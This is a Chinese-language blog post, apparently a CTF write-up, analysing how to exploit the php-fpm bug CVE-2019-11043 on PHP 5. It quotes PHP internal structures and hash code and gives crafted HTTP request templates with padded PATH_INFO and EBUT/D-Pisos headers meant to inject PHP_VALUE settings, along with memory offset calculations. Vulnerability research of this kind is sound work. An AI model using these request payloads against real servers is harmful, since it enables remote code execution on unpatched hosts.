<!DOCTYPE html><html><head><meta name="generator" content="Hexo 3.9.0"><meta charset="UTF-8"><title>CVE-2019-11043在PHP 5下的新利用方式 [ 梅子酒の笔记本 ]</title><link rel="stylesheet" href="/css/meizj.css"><link rel="stylesheet" href="/css/prettify.css"><link rel="stylesheet" href="/css/tomorrow-night-blue.css"><link rel="stylesheet" href="/css/screen.css"><link rel="stylesheet" href="/css/tag.css"><script src="https://cdn.bootcss.com/jquery/3.4.0/jquery.min.js"></script><script src="https://cdn.bootcss.com/lazysizes/5.1.0/lazysizes.min.js"></script><script>$("img").attr({"class":"lazyload"});



</script></head><body><div id="menu-outer"><nav id="menu-inner"><a id="menuLabel" href="/">Home</a><a id="menuLabel" href="/about">About</a><a id="menuLabel" href="/archives">Archives</a><a id="menuLabel" href="https://github.com/meizjm3i">Github</a></nav></div><div id="content-outer"><div id="content-inner"><div id="recent-posts"><a id="blogTitle">Meizj's Blog</a></div><article id="post"><h1 id="postTitle">CVE-2019-11043在PHP 5下的新利用方式</h1><h1 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h1>
<p>CVE-2019-11043在19年下半年放出，由于其精妙的利用，吸引了许多人的分析，其中在原作者的<a href="https://github.com/neex/phuip-fpizdam" target="_blank" rel="noopener">github</a>中，曾说道:</p>
<blockquote>
<p>The buffer underflow in php-fpm is present in PHP version 5. However, this exploit makes use of an optimization used for storing FastCGI variables, _fcgi_data_seg. This optimization is present only in php 7, so this particular exploit works only for php 7. There might be another exploitation technique that works in php 5.</p>
</blockquote>
<p>也就是目前放出的exploit仅支持php7下的利用，而在php5中，由于没有fcgi_data_seg这个结构体，利用方式便会产生变化，本篇文章便主要是对于PHP5下CVE-2019-11043这个漏洞的利用构造。为了和PHP7下的利用思路承接，后续的分析会尽量对照描述。</p>
<p>本篇也是2019年1月空字节CTF的<code>Plz Rce Again</code>的题解。</p>
<h1 id="fastcgi相关结构体"><a class="markdownIt-Anchor" href="#fastcgi相关结构体"></a> Fastcgi相关结构体</h1>
<p>在PHP5.6.31的/sapi/fpm/fastcgi.h这个文件中，能看到一些结构体，需要着重注意的是fcgi_request:</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">fcgi_request</span> &#123;</span></span><br><span class="line">	<span class="keyword">int</span>            listen_socket;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _WIN32</span></span><br><span class="line">	<span class="keyword">int</span>            tcp;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">int</span>            fd;</span><br><span class="line">	<span class="keyword">int</span>            id;</span><br><span class="line">	<span class="keyword">int</span>            keep;</span><br><span class="line">	<span class="keyword">int</span>            closed;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span>            in_len;</span><br><span class="line">	<span class="keyword">int</span>            in_pad;</span><br><span class="line"></span><br><span class="line">	fcgi_header   *out_hdr;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *out_pos;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span>  out_buf[<span class="number">1024</span>*<span class="number">8</span>];</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span>  reserved[<span class="keyword">sizeof</span>(fcgi_end_request_rec)];</span><br><span class="line"></span><br><span class="line">	HashTable     *env;</span><br><span class="line">&#125; fcgi_request;</span><br></pre></td></tr></table></figure>
<p>在fcgi_request的env中，存放着我们所需要的各种header信息，这也包括了PATH_INFO。如果我们将env打印出来，会发现它的结构如下：<br>
<img src="http://blog-pic-meizj.oss-cn-shanghai.aliyuncs.com/2019/12/19/ping-mu-kuai-zhao-20191219-xia-wu70720.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,text_bWVpemo=,color_f5eded,size_40,x_10,y_10" alt="屏幕快照 2019-12-19 下午7.07.20"></p>
<p>这里需要介绍一下在Zend中HashTable。在PHP中，各种常量、变量、函数、类、对象等都用HashTable来组织，这是一个十分重要的结构体。HashTable的定义在/Zend/zend_hash.h中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">bucket</span> &#123;</span></span><br><span class="line">ulong h;       <span class="comment">/* Used for numeric indexing */</span></span><br><span class="line">uint nKeyLength;     <span class="comment">/* key 长度 */</span></span><br><span class="line"><span class="keyword">void</span> *pData;      <span class="comment">/* 指向Bucket中保存的数据的指针 */</span></span><br><span class="line"><span class="keyword">void</span> *pDataPtr;     <span class="comment">/* 指针数据 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bucket</span> *<span class="title">pListNext</span>;</span>   <span class="comment">/* 指向HashTable桶列中下一个元素 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bucket</span> *<span class="title">pListLast</span>;</span>    <span class="comment">/* 指向HashTable桶列中前一个元素 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bucket</span> *<span class="title">pNext</span>;</span>    <span class="comment">/* 指向具有同一个hash值的桶列的后一个元素 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bucket</span> *<span class="title">pLast</span>;</span>    <span class="comment">/* 指向具有同一个hash值的桶列的前一个元素 */</span></span><br><span class="line"><span class="keyword">char</span> arKey[<span class="number">1</span>];      <span class="comment">/* 必须是最后一个成员，key名称*/</span></span><br><span class="line">&#125; Bucket;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">hashtable</span> &#123;</span></span><br><span class="line">	uint nTableSize;</span><br><span class="line">	uint nTableMask;</span><br><span class="line">	uint nNumOfElements;</span><br><span class="line">	ulong nNextFreeElement;</span><br><span class="line">	Bucket *pInternalPointer;	<span class="comment">/* Used for element traversal */</span></span><br><span class="line">	Bucket *pListHead;</span><br><span class="line">	Bucket *pListTail;</span><br><span class="line">	Bucket **arBuckets;</span><br><span class="line">	<span class="keyword">dtor_func_t</span> pDestructor;</span><br><span class="line">	zend_bool persistent;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> nApplyCount;</span><br><span class="line">	zend_bool bApplyProtection;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> ZEND_DEBUG</span></span><br><span class="line">	<span class="keyword">int</span> inconsistent;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125; HashTable;</span><br></pre></td></tr></table></figure>
<p><img src="http://www.php-internals.com/images/book/chapt03/03-01-02-zend_hashtable.png" alt></p>
<p>PHP5中的FCGI_HASH_FUNC与PHP7的定义是一致的，因此在CVE-2019-11413的PHP7利用中的<code>HTTP_EBUT</code>仍然可以使用:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FCGI_HASH_FUNC(var, var_len) \</span></span><br><span class="line">	(UNEXPECTED(var_len &lt; <span class="number">3</span>) ? var_len : \</span><br><span class="line">		(((<span class="keyword">unsigned</span> <span class="keyword">int</span>)var[<span class="number">3</span>]) &lt;&lt; <span class="number">2</span>) + \</span><br><span class="line">		(((<span class="keyword">unsigned</span> <span class="keyword">int</span>)var[var_len<span class="number">-2</span>]) &lt;&lt; <span class="number">4</span>) + \</span><br><span class="line">		(((<span class="keyword">unsigned</span> <span class="keyword">int</span>)var[var_len<span class="number">-1</span>]) &lt;&lt; <span class="number">2</span>) + \</span><br><span class="line">		var_len)</span><br></pre></td></tr></table></figure>
<p><img src="http://blog-pic-meizj.oss-cn-shanghai.aliyuncs.com/2019/12/20/15767722440902.jpg?x-oss-process=image/auto-orient,1/quality,q_90/watermark,text_bWVpemo=,color_f5eded,size_40,x_10,y_10" alt></p>
<h1 id="思路"><a class="markdownIt-Anchor" href="#思路"></a> 思路</h1>
<p><img src="http://blog-pic-meizj.oss-cn-shanghai.aliyuncs.com/2019/12/25/15772032598749.jpg?x-oss-process=image/auto-orient,1/quality,q_90/watermark,text_bWVpemo=,color_f5eded,size_40,x_10,y_10" alt></p>
<p><img src="http://blog-pic-meizj.oss-cn-shanghai.aliyuncs.com/2019/12/25/15772032768265.jpg?x-oss-process=image/auto-orient,1/quality,q_90/watermark,text_bWVpemo=,color_f5eded,size_40,x_10,y_10" alt></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET index.php/PHP_VALUE;;;QQQQQQQ.....</span><br><span class="line">D-Pisos: 8========</span><br><span class="line">EBUT: session_auto_start=1;</span><br></pre></td></tr></table></figure>
<p>通过空字节写，让HTTP_EBUT的arKey的地址指向<code>PHP_VALUE;;;QQQQQQQ....</code>，此时HTTP_EBUT的arKey就是PHP_VALUE了。</p>
<p>有个问题…</p>
<p>HTTP_EBUT的地址在PATH_INFO后面</p>
<p>此时HTTP_EBUT这个Bucket的内容就是<code>session_auto_start=1</code>，形式就是:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pData: xxx</span><br><span class="line">pDataPtr: session_auto_start=1</span><br><span class="line">...</span><br><span class="line">arKey: addr(&apos;PHP_VALUE;;;QQQQQQQ....&apos;)</span><br></pre></td></tr></table></figure>
<h1 id="思路二"><a class="markdownIt-Anchor" href="#思路二"></a> 思路二</h1>
<p>不断增长PATH_INFO的长度，导致新malloc一块地址，此时最前面的是HashTable，结合HashTable的结构体定义去制造偏移：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> typedef struct _hashtable &#123;</span><br><span class="line">	uint nTableSize;</span><br><span class="line">	uint nTableMask;</span><br><span class="line">	uint nNumOfElements;</span><br><span class="line">	ulong nNextFreeElement;</span><br><span class="line">	Bucket *pInternalPointer;	/* Used for element traversal */</span><br><span class="line">	Bucket *pListHead;</span><br><span class="line">	Bucket *pListTail;</span><br><span class="line">	Bucket **arBuckets;</span><br><span class="line">	dtor_func_t pDestructor;</span><br><span class="line">	zend_bool persistent;</span><br><span class="line">	unsigned char nApplyCount;</span><br><span class="line">	zend_bool bApplyProtection;</span><br><span class="line">#if ZEND_DEBUG</span><br><span class="line">	int inconsistent;</span><br><span class="line">#endif</span><br><span class="line">&#125; HashTable;</span><br></pre></td></tr></table></figure>
<p>偏移量就是<code>(struct bucket)*3+(void pointer)*2+uint+ulong+int+(zend_bool)*2+(unsigned char)+dtor_func_t</code></p>
<p>换算成PATH_INFO就是<code>PHP_VALUE;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</code></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8*3+8*2+4*3+4*2+1+8=24+16+12+8+1+8=69</span><br></pre></td></tr></table></figure>
<p>构造的HTTP报文格式为：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">GET index.php/PHP_VALUE;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;QQQQQQQQQQ.....</span><br><span class="line">D-Pisos: 8========...</span><br><span class="line">EBUT: session_auto_start=1;</span><br></pre></td></tr></table></figure>
<p>将<code>HashTable</code>中的arBuckets的地址最后两位覆盖为00，通过不断增长的<code>HTTP_DISPOS</code>去使<code>HTTP_EBUT</code>的地址变为以00结尾的，此时<code>PHP_VALUE</code>也会被赋值过去，成功修改fastcgi_params。赋值的逻辑部分为：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (IS_INTERNED(arKey)) &#123;</span><br><span class="line">	p = (Bucket *) pemalloc(<span class="keyword">sizeof</span>(Bucket), ht-&gt;persistent);</span><br><span class="line">	p-&gt;arKey = arKey;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	p = (Bucket *) pemalloc(<span class="keyword">sizeof</span>(Bucket) + nKeyLength, ht-&gt;persistent);</span><br><span class="line">	p-&gt;arKey = (<span class="keyword">const</span> <span class="keyword">char</span>*)(p + <span class="number">1</span>);</span><br><span class="line">	<span class="built_in">memcpy</span>((<span class="keyword">char</span>*)p-&gt;arKey, arKey, nKeyLength);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> static void zend_hash_do_resize(HashTable *ht)</span><br><span class="line">&#123;</span><br><span class="line">	Bucket **t;</span><br><span class="line">#ifdef ZEND_SIGNALS</span><br><span class="line">	TSRMLS_FETCH();</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">	IS_CONSISTENT(ht);</span><br><span class="line"></span><br><span class="line">	if ((ht-&gt;nTableSize &lt;&lt; 1) &gt; 0) &#123;	/* Let&apos;s double the table size */</span><br><span class="line">		t = (Bucket **) perealloc(ht-&gt;arBuckets, (ht-&gt;nTableSize &lt;&lt; 1) * sizeof(Bucket *), ht-&gt;persistent);</span><br><span class="line">		HANDLE_BLOCK_INTERRUPTIONS();</span><br><span class="line">		ht-&gt;arBuckets = t;</span><br><span class="line">		ht-&gt;nTableSize = (ht-&gt;nTableSize &lt;&lt; 1);</span><br><span class="line">		ht-&gt;nTableMask = ht-&gt;nTableSize - 1;</span><br><span class="line">		zend_hash_rehash(ht);</span><br><span class="line">		HANDLE_UNBLOCK_INTERRUPTIONS();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></article><div id="paginator"></div><div id="toc"></div></div></div><div id="footer"><div id="bottom-inner"><span>Powerd By </span><span> Meizj </span><span>using    </span><a href="https://github.com/meizjm3i/Meizj"><span>Meizj</span></a><span>.</span><br></div></div><script src="/js/prettify.js"></script><script src="/js/meizj.js"></script><script>//- $(window).on('load', function(){ 
$('pre').addClass('prettyprint linenums');
prettyPrint();
//- });
$(".gutter").remove();</script></body></html>